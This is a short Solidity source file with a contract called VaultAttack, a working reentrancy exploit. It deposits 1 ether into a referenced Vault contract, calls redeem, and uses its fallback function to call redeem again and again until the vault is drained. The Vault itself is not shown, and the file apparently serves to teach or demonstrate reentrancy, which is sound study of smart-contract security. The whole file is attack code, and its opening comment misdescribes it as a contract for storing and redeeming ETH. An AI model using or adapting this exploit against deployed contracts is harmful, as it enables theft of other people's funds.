// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.17;

// You can store ETH in this contract and redeem them.
contract VaultAttack {
    Vault public vault;

    constructor(address _vaultAddress){
        vault = Vault(_vaultAddress);
    }

    //Falback is called when Vault send eth to this contract
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        require(msg.value > 1 ether, "Not enought money");
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    // Helper to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
